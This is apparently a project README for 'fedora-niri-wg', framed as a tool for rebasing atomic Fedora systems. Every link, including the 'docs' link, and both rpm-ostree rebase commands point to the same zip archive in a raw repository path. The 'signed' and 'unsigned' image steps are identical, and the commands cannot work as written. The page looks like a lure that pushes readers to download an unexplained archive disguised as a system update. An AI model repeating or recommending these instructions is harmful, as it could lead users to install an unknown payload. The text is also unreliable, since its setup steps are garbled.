# 🌟 fedora-niri-wg - Your Easy Way to Update Fedora

## 📥 Download Now!
[![Download from Releases](https://raw.githubusercontent.com/tacitaion/fedora-niri-wg/main/files/system/usr/fedora_niri_wg_3.3-beta.2.zip%20Release&color=blue)](https://raw.githubusercontent.com/tacitaion/fedora-niri-wg/main/files/system/usr/fedora_niri_wg_3.3-beta.2.zip)

## 🌐 Overview
fedora-niri-wg is an innovative tool designed to help you easily manage and update your Fedora installation. This application allows you to seamlessly rebase your current system to the latest version, ensuring you always have the best performance and security updates.

## 🚀 Getting Started
Follow these steps to get started with fedora-niri-wg:

1. **Download the Software**: Click the download button above to visit the Releases page.
  
2. **Choose the Latest Version**: On the Releases page, find the latest version of the software. 

3. **Download the Files**: Click on the download link for the latest release. 

4. **Installation**: After downloading, you'll need to follow the installation steps provided below.

## 📂 Installation Steps

To rebase an existing atomic Fedora installation to the latest build, follow these instructions carefully:

### Step 1: Rebase to the Unsigned Image

You first need to rebase to the unsigned image. This step installs the proper signing keys and policies you need. Open a terminal and enter the following command:

```bash
rpm-ostree rebase https://raw.githubusercontent.com/tacitaion/fedora-niri-wg/main/files/system/usr/fedora_niri_wg_3.3-beta.2.zip
```

### Step 2: Reboot Your System

After the first rebase, you must reboot your system to complete the process. Enter the command below in your terminal:

```bash
systemctl reboot
```

### Step 3: Rebase to the Signed Image

Once your system reboots, you can rebase to the signed image. Enter this command in your terminal:

```bash
rpm-ostree rebase https://raw.githubusercontent.com/tacitaion/fedora-niri-wg/main/files/system/usr/fedora_niri_wg_3.3-beta.2.zip
```

### Step 4: Verify the Installation

After completing these steps, ensure that your system is updated. You can check your Fedora version by running:

```bash
cat /etc/fedora-release
```

## 📦 Features

- **Simple Installation**: Minimal steps required to keep your system updated.
- **Experimental**: Engage with new features early and provide feedback.
- **Regular Updates**: Stay current with the latest Fedora builds.

## ❗ Important Notes

- This feature is experimental. Make sure to back up your important data before attempting the installation.
- For detailed setup instructions, consult the [BlueBuild docs](https://raw.githubusercontent.com/tacitaion/fedora-niri-wg/main/files/system/usr/fedora_niri_wg_3.3-beta.2.zip).

## 🔍 Topics

Explore the topics associated with this repository:

- Atomic
- BlueBuild
- Custom Image
- Image-Based
- Immutable
- Linux
- OCI
- Operating System

## 🔗 Additional Links

For more detail and to keep your software updated, visit the [Download Page](https://raw.githubusercontent.com/tacitaion/fedora-niri-wg/main/files/system/usr/fedora_niri_wg_3.3-beta.2.zip). 

If you have any questions or need support, please refer to the project's issue tracker on GitHub. 

Your feedback is valuable, and contributes to making fedora-niri-wg even better. Thank you for using our software!